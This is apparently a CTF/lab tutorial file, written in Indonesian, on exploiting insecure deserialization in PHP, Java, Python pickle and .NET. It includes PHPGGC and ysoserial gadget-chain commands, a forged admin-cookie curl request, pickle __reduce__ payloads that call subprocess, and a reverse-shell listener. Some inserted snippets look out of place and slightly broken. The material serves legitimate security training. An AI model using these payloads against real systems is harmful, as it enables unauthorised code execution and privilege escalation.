---
id: "32"
title: "32 — Deserialization Workflow 🔐"
category: "3. Web Exploitation"
categoryId: "web"
filename: "32_deserialization_workflow.md"
refs_out: ["14a","14c","14d","31","33","35","44","45"]
refs_in: ["04","31","33"]
---

# 32 — Deserialization Workflow 🔐

> **Scope:** CTF, PortSwigger Web Security Academy, dan lab yang memang Anda punya izin untuk uji.  
> **Platform:** Parrot OS XFCE / Debian-based  
> **Prerequisite:** Workflow 00–31, terutama Recon, HTTP Analysis, File Upload, SSRF, XXE, Command Injection, RCE, dan HTTP Smuggling.
> 
> ⚠️ **WARNING:** Jangan menguji deserialization pada production tanpa izin eksplisit. Deserialization yang tidak aman dapat menyebabkan object manipulation, SSRF/OOB interaction, arbitrary file access, command execution, crash, denial of service, atau RCE. Untuk latihan, gunakan PortSwigger Web Security Academy, HTB, Root-Me, DVWA/custom lab, atau target lokal.

---

## 🧭 Navigation

← [File 31: HTTP Smuggling](/docs/http-smuggling)  
→ [File 33: CORS](/docs/cors)

---

# 🧠 BAGIAN 0 — FUNDAMENTALS

## 0.1 Apa Itu Deserialization

### Serialization secara sederhana

Bayangkan Anda mempunyai sebuah objek:

```
User
├── name = "admin"
├── role = "administrator"
└── logged_in = true
```

Kalau objek tersebut ingin disimpan atau dikirim melalui jaringan, aplikasi tidak selalu bisa mengirim object tersebut apa adanya.

Aplikasi mengubah object menjadi bentuk data:

```
Object
   ↓
Serialization
   ↓
Data/String/Bytes
   ↓
Network / Cookie / File / Database
```

Proses ini disebut **serialization**.

Sebaliknya ketika data diterima aplikasi:

```
Serialized Data
      ↓
Deserialization
      ↓
Object
```

Aplikasi membaca data lalu membangun kembali object.

---

### Analogi sederhana

Bayangkan Anda mengirim koper.

```
Barang
  ↓
Dimasukkan ke koper
  ↓
Dikirim
  ↓
Koper dibuka
  ↓
Barang dibentuk kembali
```

Serialization:

```
Barang → Koper
```

Deserialization:

```
Koper → Barang
```

Masalah keamanan muncul ketika **penerima memperbolehkan pengirim menentukan bukan hanya isi barang, tetapi juga struktur dan perilaku object yang dibuat kembali.**

---

## 🔥 Kenapa Deserialization Berbahaya?

Deserialization menjadi berbahaya ketika beberapa kondisi bertemu:

```
Attacker-controlled data
        +
Dangerous deserialization
        +
Attacker-controlled object/class state
        +
Reachable gadget/sink
        ↓
Potential Code Execution
```

Bahkan tanpa RCE, efeknya dapat berupa:

```
Privilege Escalation
IDOR-like object manipulation
Authentication bypass
SSRF
File write
File delete
Logic abuse
SQL interaction
Command execution
RCE
```

---

## 🗺️ Diagram Dasar

```
                         ATTACK SURFACE
                              │
                              ▼
┌────────┐     ┌──────────────┐     ┌───────────────┐
│ Object │ --> │  Serialize   │ --> │ Network/File │
└────────┘     └──────────────┘     └───────┬───────┘
                                            │
                                            ▼
                                   ┌────────────────┐
                                   │ USER-CONTROLLED│
                                   │     DATA       │
                                   └───────┬────────┘
                                           │
                                           ▼
                                  ┌─────────────────┐
                                  │  Deserialize()  │
                                  └───────┬─────────┘
                                          │
                           ATTACK HERE --> │
                                          ▼
                                   ┌────────────┐
                                   │   Object   │
                                   └─────┬──────┘
                                         │
                         ┌───────────────┼───────────────┐
                         ▼               ▼               ▼
                    Magic Method     Gadget Chain      Sink
                         │               │               │
                         └───────────────┼───────────────┘
                                         ▼
                                        RCE
```

---

## ✅ Kondisi yang Diperlukan agar Vulnerability Terjadi

Jangan berasumsi:

> "Ada serialized data = pasti deserialization vulnerability."

Itu **salah**.

Minimal cari:

```
1. Attacker dapat mengontrol data
        ↓
2. Server melakukan deserialization
        ↓
3. Attacker dapat mempengaruhi object/state
        ↓
4. Ada dangerous behavior
        ↓
5. Ada reachable sink/gadget
```

Secara metodologis:

```
Serialized Input
      │
      ├── Server hanya decode string?
      │       └── belum tentu vulnerable
      │
      ├── Server membangun object?
      │       └── lanjut
      │
      ├── Object memicu behavior?
      │       └── lanjut
      │
      └── Ada gadget/sink?
              └── potential exploit
```

---

## 🆚 Deserialization Vulnerability vs Deserialization Exploit

### Vulnerability

Kondisi desain aplikasi yang memungkinkan attacker memengaruhi proses deserialization.

Contoh:

```
$data = unserialize($_COOKIE['session']);
```

Masalahnya:

```
Attacker → COOKIE → unserialize()
```

### Exploit

Payload atau teknik yang memanfaatkan vulnerability tersebut.

Jadi:

```
Vulnerability = kelemahannya

Exploit = cara memanfaatkan kelemahan
```

Ini penting karena:

```
Deserialization vulnerability
        ≠
Instant RCE
```

Bisa saja vulnerability ada tetapi:

```
Tidak ada gadget chain
Tidak ada sink
Version tidak compatible
Class tidak tersedia
Dependency berbeda
Input dibatasi
Signature/MAC validasi
Encryption aktif
```

---

## 🔗 Kenapa Gadget Chain Penting?

Deserialization sering tidak langsung memanggil:

```
system()
```

Sebaliknya attacker memanfaatkan object yang sudah ada di aplikasi/library.

Contoh konsep:

```
unserialize()
   ↓
Object A
   ↓
__wakeup()
   ↓
Object B
   ↓
__toString()
   ↓
Object C
   ↓
dangerous method
   ↓
command execution
```

Rantai object tersebut dikenal sebagai:

```
Gadget Chain
```

**Gadget** adalah code yang sebenarnya mungkin tidak dirancang sebagai exploit, tetapi ketika disusun dalam urutan tertentu dapat mencapai dangerous sink.

---

# 📦 0.2 Serialization Format

|Bahasa/Platform|Format|Ciri Khas di Traffic/File|
|---|---|---|
|PHP|`serialize()`|`O:`, `a:`, `s:`, `i:`, `b:`|
|Java|Object Serialization|Magic bytes `AC ED 00 05`|
|Python|Pickle|Binary stream, `80 04`, `80 05`, opcodes|
|Ruby|Marshal|Binary, sering diawali `04 08`|
|.NET|BinaryFormatter|Binary serialized object metadata|
|JSON|JSON|`{}`, `[]`, string/value biasa|
|XML|XML|`<tag>...</tag>`|
|Java XMLDecoder|XML object representation|`<java>`, `<object>`, `<void>`|
|YAML|YAML|`---`, mapping/list/object syntax|

---

# 🔎 0.3 Cara Identifikasi Serialized Data

## 🐘 PHP

### Signature

Tidak mempunyai universal "magic bytes" seperti Java.
## 📊 Framework → Serialization Mapping
| Framework | Language/Platform | Serialization Mechanism |
|-----------|-------------------|------------------------|
| Django    | Python            | Pickle (in signed cookies) |
| Rails     | Ruby              | Marshal |
| Express   | Node.js           | JSON |
| ASP.NET   | .NET              | BinaryFormatter / ViewState |
| Spring    | Java              | Java Object Serialization |
| Laravel   | PHP               | PHP `serialize()` |

Pattern penting:

```
O:<length>:"Class":...
a:<count>:{...}
s:<length>:"..."
i:<number>
b:<0|1>
d:<number>
N;
```

### Contoh Traffic

```
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO30=
```

Setelah Base64 decode:

```
O:4:"User":1:{s:4:"name";s:5:"admin";}
```

### Decode

```
# Decode Base64 ke terminal
echo 'Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO30=' | base64 -d

# Decode ke file
echo 'Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6NToiYWRtaW4iO30=' | base64 -d > payload.txt
```

Tool:

```
Burp Suite Decoder
CyberChef
base64
PHP sendiri untuk analysis
PHPGGC
```

---

## ☕ Java

### Magic Bytes

```
AC ED 00 05
```

Artinya serialized Java stream sangat sering dimulai:

```
AC ED 00 05
```

### Contoh Burp Hex View

```
00000000  ac ed 00 05 73 72 00 04 55 73 65 72
0000000c  7e 12 34 56 78 9a bc de 02 00 01
00000018  4c 00 04 6e 61 6d 65 74 00 12 4c
```

ASCII kira-kira:

```
....sr..User~.4Vx......
....L.name...
```

### Detection

Di Burp:

```
Proxy
  ↓
HTTP history
  ↓
Request
  ↓
Raw / Hex
  ↓
Cari:
AC ED 00 05
```

### Tools

```
jdeserialize
SerializationDumper
ysoserial
Burp Suite
xxd
hexdump
```

---

## 🐍 Python Pickle

### Signature Umum

Protocol pickle modern sering terlihat binary:

```
80 03
80 04
80 05
```

Contoh:

```
80 04 95 ... 
```

Namun **jangan mengandalkan magic bytes saja**.

### Traffic

```
POST /api/import HTTP/1.1
Content-Type: application/octet-stream

(binary data)
```

Atau:
# Detect Pickle Payloads in Traffic
```bash
# Using tcpdump
tcpdump -A -s 0 -i any 'tcp port 80' | grep -E "\\x80\\x03|\\x80\\x04|\\x80\\x05"
# Or with Python
python3 - <<'PY'
import sys, re
data = sys.stdin.buffer.read()
if re.search(br"\\x80[\\x03-\\x05]", data):
    print("Pickle payload detected")
PY
```

```
POST /restore HTTP/1.1

gASV...
```

String Base64 seperti:

```
gASV...
```

sering terlihat ketika pickle di-Base64.

### Decode

**Jangan langsung menjalankan `pickle.loads()` terhadap data tidak tepercaya.**

Untuk analysis:

```
# Decode Base64 tanpa mengeksekusi pickle
echo 'gASV...' | base64 -d > object.bin

# Tampilkan hex
xxd object.bin

# Tampilkan byte
hexdump -C object.bin
```

Tool:

```
Python pickle tools
pickletools.dis()
Burp Decoder
CyberChef
xxd
```

---

## 💎 Ruby Marshal

Signature yang sering ditemui:

```
04 08
```

Contoh:

```
04 08 5B 08 ...
```

Decode dilakukan menggunakan tooling Ruby/Marshal pada **copy data**, bukan langsung dengan input attacker di lingkungan sensitif.

---

## 🟣 .NET BinaryFormatter

BinaryFormatter tidak mempunyai signature sesederhana Java:

```
AC ED 00 05
```

Cari:

```
.NET serialization metadata
BinaryFormatter patterns
LosFormatter/ViewState
Base64 blobs
```

Tool:
# ViewState MAC Detection & interactsh-client (binary)
```bash
# Extract __VIEWSTATE and inspect MAC
curl -s http://target/page | grep -o "value='[^']*'" | cut -d'\'' -f2 > vs.txt
base64 -d vs.txt | hexdump -C | head

# Install interactsh-client (binary)
curl -L https://github.com/projectdiscovery/interactsh/releases/latest/download/interactsh-linux-amd64.tar.gz -o /tmp/interactsh.tar.gz
tar -xzvf /tmp/interactsh.tar.gz -C /usr/local/bin interactsh
chmod +x /usr/local/bin/interactsh
```

```
ysoserial.net
ViewState tooling
Burp Suite
dnSpy / ILSpy
```

---

## 🟨 JSON

Contoh:

```
{
  "name": "admin",
  "role": "user"
}
```

JSON sendiri **bukan native object serialization yang inherently dangerous**.

Masalah muncul ketika framework menggunakan JSON untuk menentukan concrete type.

Contoh pola berbahaya:

```
{
  "$type": "..."
}
```

atau konfigurasi seperti:

```
TypeNameHandling.All
```

---

## 🧾 XML

Contoh:

```
<user>
    <name>admin</name>
</user>
```

XML biasanya lebih relevan dengan:

```
XXE
XMLDecoder
object construction
custom deserialization
```

Java `XMLDecoder` harus dianggap sangat sensitif karena XML dapat merepresentasikan operasi/object creation.

---

## 🟧 YAML

Contoh:

```
user:
  name: admin
  role: user
```

Bahaya terutama ketika parser/framework memperbolehkan:

```
arbitrary object construction
custom tags
unsafe constructors
```

---

# 🐘 BAGIAN 1 — PHP DESERIALIZATION

# 1.1 PHP Serialization Format

## ⚙️ Cara Kerja

Serialization:

```
<?php

$user = [
    "name" => "admin",
    "role" => "user"
];

$data = serialize($user);
echo $data;
```
# PHP Object Injection Helpers
```bash
# After modifying payload manually
PAYLOAD='O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}'

# Encode to base64 (for cookie)
echo -n "$PAYLOAD" | base64

# URL‑encode (for parameter)
python3 -c "import urllib.parse, sys; print(urllib.parse.quote('$PAYLOAD'))"

# Send with curl
curl -b "session=$(echo -n "$PAYLOAD" | base64)" http://target/dashboard

# phpggc example
phpggc Monolog/RCE1 "system('id')" > payload.ser
cat payload.ser | base64
# Example output: (base64 string placeholder)
```

Output konsep:

```
a:2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
```

Deserialization:

```
<?php

$data = 'a:2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}';

$result = unserialize($data);
```

---

# 🔬 Format Dasar

Payload:

```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
```

Breakdown:

```
O
:
4
:
"User"
:
2
:
{
...
}
```

### Meaning

|Bagian|Arti|
|---|---|
|`O`|Object|
|`4`|panjang class name|
|`"User"`|nama class|
|`2`|jumlah property|
|`{`|mulai object properties|
|`s`|string|
|`4`|panjang string|
|`"name"`|nama property|
|`s`|string|
|`5`|panjang value|
|`"admin"`|value|
|`}`|akhir object|

---

# 🧮 Byte-by-Byte / Character-by-Character

Gunakan payload:

```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
```

Index:

```
01 O
02 :
03 4
04 :
05 "
06 U
07 s
08 e
09 r
10 "
11 :
12 2
13 :
14 {
15 s
16 :
17 4
18 :
19 "
20 n
21 a
22 m
23 e
24 "
25 ;
26 s
27 :
28 5
29 :
30 "
31 a
32 d
33 m
34 i
35 n
36 "
37 ;
38 s
39 :
40 4
41 :
42 "
43 r
44 o
45 l
46 e
47 "
48 ;
49 s
50 :
51 4
52 :
53 "
54 u
55 s
56 e
57 r
58 "
59 ;
60 }
```

Jangan bingung dengan istilah "byte".

Untuk karakter ASCII sederhana seperti contoh di atas:

```
1 karakter ASCII ≈ 1 byte
```

Tetapi untuk Unicode/multibyte string, perhitungan dapat berbeda. PHP serialization menghitung panjang string berdasarkan byte.

---

## 🔢 Length Count

Perhatikan:

```
s:4:"name";
```

`name` memiliki:

```
n a m e
↓
4 bytes
```

Sedangkan:

```
s:5:"admin";
```

`admin`:

```
a d m i n
↓
5 bytes
```

---

## 💥 Modifikasi Manual

Original:

```
s:4:"role";s:4:"user";
```

Ubah:

```
s:4:"role";s:5:"admin";
```

Perhatikan:

```
user
```

memiliki:

```
4 bytes
```

Sedangkan:

```
admin
```

memiliki:

```
5 bytes
```

Jangan melakukan:

```
s:4:"admin";
```

karena count salah.

---

## 🧠 Magic Methods

Magic methods yang sering muncul:

```
__wakeup()
__destruct()
__toString()
__call()
__get()
__set()
```

### `__wakeup()`

Umumnya dipanggil ketika object selesai di-unserialize.

```
class User
{
    public function __wakeup()
    {
        echo "Object restored";
    }
}
```

---

### `__destruct()`

Dipanggil ketika object dihancurkan.

```
class User
{
    public function __destruct()
    {
        echo "Object destroyed";
    }
}
```

---

### `__toString()`

Dipanggil ketika object digunakan sebagai string.

```
echo $object;
```

---

### `__call()`

Dipanggil ketika method yang tidak tersedia dipanggil.

---

### `__get()`

Dipanggil ketika property inaccessible/non-existent dibaca.

---

### `__set()`

Dipanggil ketika property inaccessible/non-existent ditulis.

---

## ⏱️ Kapan Magic Method Dipanggil?

```
unserialize()
     │
     ├── object reconstructed
     │
     └── __wakeup()
              │
              ▼
          application logic
              │
              ▼
         __destruct()
```

Untuk eksploitasi, jangan hanya melihat method.

Pertanyaan yang benar:

```
Method ini melakukan apa?
```

Contoh:

```
__destruct()
    ↓
$this->logger->write(...)
    ↓
Logger object
    ↓
dangerous function
```

---

# 1.2 PHP Object Injection

## 🎯 Konsep

PHP Object Injection terjadi ketika attacker dapat memasukkan serialized object ke:

```
unserialize()
```

Contoh vulnerable code:

```
<?php

class User
{
    public $name;
    public $role;
}

$data = $_COOKIE['user'];
$user = unserialize($data);
```

Flow:

```
Attacker
   ↓
Cookie
   ↓
unserialize()
   ↓
User object
```

---

# 🧪 Payload Manual

Class:

```
<?php

class User
{
    public $name;
    public $role;
}
```

Serialized object:

```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
```

---

## 🔧 Mengubah Role

Original:

```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:4:"user";}
```

Modified:

```
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
```

Logical effect:

```
role=user
      ↓
role=admin
```

Tetapi:

> Ini baru **object manipulation**. Belum berarti privilege escalation benar-benar terjadi.

Server mungkin:

```
if ($user->role === "admin") {
    ...
}
```

atau:

```
role hanya metadata
```

atau:

```
authorization menggunakan database
```

Jadi selalu validasi impact.

---

# 🧪 Lab Test Sederhana

```
# Buat direktori lab
mkdir -p ~/labs/php-deserialization

# Masuk ke direktori
cd ~/labs/php-deserialization

# Periksa versi PHP
php --version
```

---

# 1.3 PHP Gadget Chains

## 🔗 Konsep

Misalnya:

```
unserialize()
   ↓
Object A
   ↓
__destruct()
   ↓
Object B
   ↓
__toString()
   ↓
Object C
   ↓
dangerous function
```

Itulah gadget chain.

---

# 🧰 PHPGGC

PHPGGC adalah tool untuk memproduksi generic PHP gadget-chain payload berdasarkan library/framework yang tersedia. PHPGGC juga mempunyai encoder seperti Base64 dan URL encoding.

## Install

```
# Clone PHPGGC
git clone https://github.com/ambionics/phpggc.git

# Masuk ke direktori
cd phpggc

# Tampilkan bantuan
./phpggc -h
```

---

## List Gadget

```
# Tampilkan semua gadget chain
./phpggc -l

# Cari gadget Laravel
./phpggc -l laravel

# Cari gadget Symfony
./phpggc -l symfony

# Cari gadget Monolog
./phpggc -l monolog
```

---

## Generate Payload

Bentuk umum:

```
# Format umum
./phpggc <GADGET> <FUNCTION> <ARGUMENT>
```

Contoh untuk **lab yang Anda kontrol**:

```
# Contoh gadget generation
./phpggc Laravel/RCE1 system id
```

PHPGGC sendiri mendokumentasikan penggunaan seperti:

```
./phpggc Laravel/RCE1 system id
```

dan menyediakan encoder Base64/URL.

---

## Encode Base64

```
# Generate payload dalam Base64
./phpggc -b Laravel/RCE1 system id
```

URL encode:

```
# URL encode payload
./phpggc -u Laravel/RCE1 system id
```

Base64 lalu URL encoding:

```
# Base64 lalu URL encode
./phpggc -b -u Laravel/RCE1 system id
```

---

## Framework yang Perlu Diingat

```
Laravel
Symfony
Yii
Monolog
Guzzle
WordPress
SwiftMailer
Drupal
```

Tetapi:

```
Framework ditemukan
        ≠
Gadget chain pasti bekerja
```

Versi library, dependencies, PHP version, class availability, dan vector sangat penting.

---

# 1.4 PHP Deserialization → RCE

## 🧠 Flow

```
Serialized Input
       ↓
unserialize()
       ↓
Object Creation
       ↓
Magic Method
       ↓
Gadget A
       ↓
Gadget B
       ↓
Dangerous Sink
       ↓
Command Execution
       ↓
RCE
```

---

## 🧪 Gunakan Command Harmless Terlebih Dahulu

Prioritas:

```
id
whoami
hostname
sleep 3
```

Daripada langsung:

```
reverse shell
```

Contoh PHPGGC:

```
# Uji command sederhana pada lab
./phpggc Laravel/RCE1 system id

# Uji sleep untuk melihat timing
./phpggc Laravel/RCE1 system "sleep 3"
```

**Timing test** berguna ketika output command tidak terlihat.

---

## 🧪 Verifikasi OOB

Konsep:

```
Target
  ↓
Payload
  ↓
DNS/HTTP callback
  ↓
OAST server
```

Contoh tujuan:

```
Deserialization terjadi
        ↓
Payload triggered
        ↓
DNS lookup
        ↓
Callback
```

Ini lebih aman sebagai tahap awal dibanding langsung melakukan RCE.

---

## 🛰️ Catch Reverse Shell

Dalam **lab milik sendiri**, listener misalnya:

```
# Dengarkan koneksi TCP pada port 4444
nc -lvnp 4444
```

Flow:

```
Target Lab
    │
    │ reverse connection
    ▼
Parrot OS
nc -lvnp 4444
```

Untuk dokumentasi CTF, selalu simpan:

```
Target IP
Listener IP
Listener Port
Payload encoding
HTTP parameter
Response
Timestamp
```

---

# ☕ BAGIAN 2 — JAVA DESERIALIZATION

# 2.1 Java Serialization Format

## 🔑 Magic Bytes

Java Object Serialization biasanya dimulai:

```
AC ED 00 05
```

Secara hex:

```
AC ED 00 05
```

Contoh:

```
AC ED 00 05 73 72 00 04 ...
```

---

## 👀 Visual di Burp Hex

```
HEX                                      ASCII

ac ed 00 05 73 72 00 04 55 73 65 72    ....sr..User
7e 12 34 56 78 9a bc de 02 00 01 4c    ~.4Vx.......L
00 04 6e 61 6d 65 74 ...                ..name...
```

Pattern penting:

```
ac ed 00 05
```

Case insensitive ketika searching.

---

## 🎯 Common Sink

Java vulnerable pattern:

```
ObjectInputStream ois =
    new ObjectInputStream(input);

Object obj = ois.readObject();
```

Dangerous call:

```
readObject()
```

---

# 2.2 Java Gadget Chains

Tool utama:

```
ysoserial
```

Gadget populer:

```
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsCollections5
CommonsCollections6
CommonsCollections7
Spring
Hibernate
URLDNS
```

`ysoserial` source menunjukkan gadget CommonsCollections tertentu dapat berakhir di `Runtime.exec()`, tetapi keberhasilan sangat tergantung dependency dan versi runtime.

---

# 🧰 Install ysoserial

```
# Clone repository
git clone https://github.com/frohoff/ysoserial.git

# Masuk ke direktori
cd ysoserial

# Pastikan Java tersedia
java -version

# Pastikan Maven tersedia
mvn -version

# Build
mvn clean package -DskipTests
```

Output umumnya berada di:

```
target/
```

---

## List Payload

```
# Tampilkan bantuan dan daftar payload
java -jar target/ysoserial-*.jar --help
```

---

## URLDNS

URLDNS adalah gadget yang sangat berguna untuk **detection**, bukan first choice untuk RCE.

Source `URLDNS` menjelaskan bahwa mekanismenya menggunakan `HashMap` → `hashCode()` → URL lookup sehingga target dapat menghasilkan DNS lookup; URLDNS dibuat untuk vulnerability detection dan tidak membawa command execution.

---

# 2.3 Java Deserialization Detection

## 🧠 Kenapa URLDNS Sebelum RCE?

Karena:

```
Detect first
    ↓
Confirm deserialization
    ↓
Identify environment
    ↓
Select gadget
    ↓
RCE terakhir
```

Bukan:

```
Found AC ED
    ↓
langsung RCE
```

---

# 🛰️ URLDNS Concept

Payload:

```
URL Object
   ↓
HashMap
   ↓
hashCode()
   ↓
DNS resolution
   ↓
OAST callback
```

---

## Generate URLDNS

Pada lab:

```
# Generate URLDNS payload menggunakan hostname OAST milik Anda
java -jar target/ysoserial-*.jar URLDNS <YOUR-OAST-DOMAIN> > urldns.bin

# Lihat ukuran payload
ls -lh urldns.bin

# Periksa magic bytes
xxd -l 16 urldns.bin
```

Expected beginning:

```
ac ed 00 05
```

---

## Base64 untuk HTTP

```
# Encode binary payload menjadi Base64
base64 -w0 urldns.bin > urldns.b64

# Tampilkan payload
cat urldns.b64
```

---

## Kirim di Burp

Misalnya body:

```
POST /deserialize HTTP/1.1
Host: lab.local
Content-Type: application/octet-stream

<BINARY PAYLOAD>
```

atau:

```
POST /deserialize HTTP/1.1
Host: lab.local
Content-Type: text/plain

<BASE64 PAYLOAD>
```

Tergantung cara aplikasi melakukan decoding.

---

# 🛰️ Burp Collaborator / OAST

Konsep:

```
Your Payload
      ↓
Target Application
      ↓
DNS/HTTP interaction
      ↓
Collaborator
      ↓
Interaction observed
```

Jika callback muncul dari IP/server target:

```
strong evidence
```

Jika callback muncul hanya dari komputer Anda:

```
belum cukup
```

---

# 🆓 interactsh

`interactsh` merupakan alternatif OAST yang dapat dipakai untuk menerima interaction DNS/HTTP dan protokol lain.

Contoh instalasi melalui Go:

```
# Pastikan Go tersedia
go version

# Install interactsh client
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Pastikan GOPATH/bin tersedia
export PATH="$PATH:$(go env GOPATH)/bin"

# Jalankan client
interactsh-client
```

Catatan:

```
domain OAST
     ↓
masukkan ke payload
     ↓
kirim payload
     ↓
monitor interaction
```

---

# 🔬 Confirm Callback

Jangan berhenti pada:

```
"ada request DNS"
```

Analisis:

```
Source IP
Source domain
Timestamp
Protocol
Unique token
Request type
```

Gunakan identifier unik:

```
ikmal-lab-001.<OAST-DOMAIN>
```

Sehingga Anda tahu callback berasal dari payload tertentu.

---

# 2.4 Java Deserialization → RCE

## Decision

```
AC ED 00 05
      ↓
URLDNS
      ↓
callback?
 ┌────┴─────┐
NO         YES
 │           │
review       confirm
target       environment
              ↓
       gadget enumeration
              ↓
       compatible chain
              ↓
          harmless test
              ↓
             RCE
```

---

## Generate Gadget

Format umum:

```
# Format umum
java -jar target/ysoserial-*.jar <GADGET> '<COMMAND>' > payload.bin
```

Untuk **lab lokal**, prioritaskan command non-destructive seperti:

```
# Contoh command harmless
java -jar target/ysoserial-*.jar <GADGET> 'id' > payload.bin
```

---

## Troubleshooting

Jika:

```
ClassNotFoundException
```

maka dependency target mungkin tidak sama.

Jika:

```
IncompatibleClassChangeError
```

kemungkinan version mismatch.

Jika:

```
payload generated successfully
```

belum berarti:

```
payload executed successfully
```

---

# 🧰 Alternative: marshalsec

`marshalsec` menyediakan tooling untuk beberapa Java marshalling/unmarshalling format dan dapat digunakan untuk menguji berbagai marshaller; build command yang didokumentasikan project adalah Maven dengan Java 8.

```
# Clone marshalsec
git clone https://github.com/mbechler/marshalsec.git

# Masuk direktori
cd marshalsec

# Build
mvn clean package -DskipTests

# Lihat hasil build
ls -lh target/
```

---

# 🐍 BAGIAN 3 — PYTHON PICKLE

# 3.1 Python Pickle Fundamentals

## ⚙️ Cara Kerja

```
import pickle

data = {
    "name": "admin"
}

serialized = pickle.dumps(data)

restored = pickle.loads(serialized)
```

Flow:

```
Python Object
     ↓
pickle.dumps()
     ↓
Binary Data
     ↓
pickle.loads()
     ↓
Python Object
```

---

# ☠️ Kenapa Pickle Berbahaya?

`pickle` dirancang untuk serialisasi Python object, bukan format data untrusted.

Masalah kritis:

```
pickle.loads(untrusted_data)
```

Karena pickle dapat merepresentasikan operasi yang menyebabkan callable dijalankan saat reconstruction.

---

# 🔥 `__reduce__`

Salah satu konsep terpenting:

```
__reduce__()
```

Contoh lab:

```
import pickle


class Demo:
    def __reduce__(self):
        return (print, ("PICKLE_EXECUTED",))


obj = Demo()

payload = pickle.dumps(obj)

print(payload)
```

Konsep:

```
pickle.loads()
       ↓
__reduce__()
       ↓
callable
       ↓
execution
```

---

# 3.2 Craft Pickle Payload

## 🧪 Harmless Test

```
import pickle


class Demo:
    def __reduce__(self):
        return (print, ("DESERIALIZATION_OK",))


payload = pickle.dumps(Demo())

with open("payload.bin", "wb") as f:
    f.write(payload)

print("Payload written to payload.bin")
```

Run:

```
# Jalankan pembuat payload
python3 create_pickle.py

# Periksa file
file payload.bin

# Tampilkan hex
xxd payload.bin
```

---

## 🧪 Demonstrasi Command Execution

Gunakan **hanya pada lab**.

```
import pickle
import subprocess


class Demo:
    def __reduce__(self):
        return (
            subprocess.call,
            (["id"],)
        )


payload = pickle.dumps(Demo())

with open("payload.bin", "wb") as f:
    f.write(payload)
```

Ketika aplikasi vulnerable melakukan:

```
pickle.loads(payload)
```

maka:

```
__reduce__()
     ↓
subprocess.call()
     ↓
id
```

---

# 🔢 Base64

```
# Base64 encode payload
base64 -w0 payload.bin > payload.b64

# Tampilkan payload
cat payload.b64
```

Contoh transport:

```
POST /import HTTP/1.1
Content-Type: text/plain

gASV...
```

---

# 3.3 Detection & Exploitation

## Detection Sequence

```
Binary blob?
     ↓
Base64?
     ↓
Decode
     ↓
80 04 / 80 05?
     ↓
pickle suspicion
```

---

## Harmless Test

Jangan langsung command execution.

Gunakan:

```
print()
sleep()
OAST callback
```

atau custom lab class.

---

## Escalation

```
Identify pickle
       ↓
Confirm loads()
       ↓
Harmless callback
       ↓
Confirm execution
       ↓
Controlled command
       ↓
RCE
```

---

# 🟣 BAGIAN 4 — .NET DESERIALIZATION

# 4.1 .NET Serialization

Fokus utama:

```
BinaryFormatter
JSON.NET TypeNameHandling
XmlSerializer
ViewState
LosFormatter
ObjectStateFormatter
```

---

## ⚠️ BinaryFormatter

`BinaryFormatter` adalah teknologi lama dan dianggap unsafe/deprecated pada modern .NET.

Masalah utama:

```
attacker-controlled serialized object
              ↓
BinaryFormatter.Deserialize()
              ↓
object graph reconstruction
```

---

# 🧾 ViewState

ViewState sangat penting dalam web exploitation ASP.NET.

Contoh:

```
<input
    type="hidden"
    name="__VIEWSTATE"
    value="/wEPDwUJ..."
/>
```

Biasanya ada:

```
__VIEWSTATE
__EVENTVALIDATION
```

---

# 4.2 ViewState Exploitation

## Apa Itu ViewState?

ASP.NET Web Forms menggunakan ViewState untuk mempertahankan state antara request.

Flow:

```
Browser
   ↓
__VIEWSTATE
   ↓
ASP.NET
   ↓
State reconstruction
```

---

# 🔍 Decode ViewState

ViewState sering Base64.

```
# Decode ViewState
echo '<BASE64-VIEWSTATE>' | base64 -d > viewstate.bin

# Periksa file
file viewstate.bin

# Tampilkan hex
xxd viewstate.bin
```

Tetapi:

```
decode berhasil
    ≠
exploit berhasil
```

---

# 🔐 Hal yang Harus Diperiksa

```
MAC enabled?
Encryption enabled?
ViewStateUserKey?
MachineKey?
Framework version?
ASP.NET version?
Page configuration?
```

Jika ViewState menggunakan MAC yang benar dan attacker tidak memiliki key:

```
mencoba mengubah value biasa
        ↓
MAC invalid
        ↓
request rejected
```

---

# 🧰 ysoserial.net

Tool yang umum untuk penelitian .NET deserialization/ViewState:

```
ysoserial.net
```

Project ini memiliki plugin `ViewState` yang bekerja dengan parameter seperti validation key, validation algorithm, decryption key, decryption algorithm, dan ViewStateUserKey.

Pada Linux:

```
# Clone ysoserial.net
git clone https://github.com/pwntester/ysoserial.net.git

# Masuk direktori
cd ysoserial.net

# Lihat source/plugin
find . -iname '*ViewState*'
```

Tool ini paling nyaman dijalankan pada environment .NET/Mono yang sesuai atau Windows lab VM bila build Linux mengalami incompatibility.

---

# 📦 ViewState Payload Flow

```
Application
     ↓
Identify __VIEWSTATE
     ↓
Determine MAC/encryption
     ↓
Obtain legitimate configuration in lab
     ↓
Generate test payload
     ↓
Inject
     ↓
Submit form
     ↓
Observe behavior
```

---

# 🟨 4.3 JSON.NET TypeNameHandling

## Konsep

Json.NET mempunyai kemampuan polymorphic type handling.

Configuration yang sangat berisiko:

```
TypeNameHandling.All
```

dan variasinya:

```
TypeNameHandling.Auto
TypeNameHandling.Objects
TypeNameHandling.Arrays
TypeNameHandling.None
```

Masalah keamanan biasanya muncul ketika:

```
attacker controls $type
```

dan aplikasi:

```
mempercayai type yang diberikan attacker
```

---

## Contoh Konseptual

```
{
  "$type": "Some.Namespace.SomeType, SomeAssembly",
  "name": "lab"
}
```

Untuk assessment:

```
$type input?
     ↓
Concrete type attacker-controlled?
     ↓
Can instantiate dangerous type?
     ↓
Dangerous property setter?
     ↓
Gadget/sink?
```

---

## Tool

```
ysoserial.net
Burp Suite
ILSpy
dnSpy
dotnet tooling
```
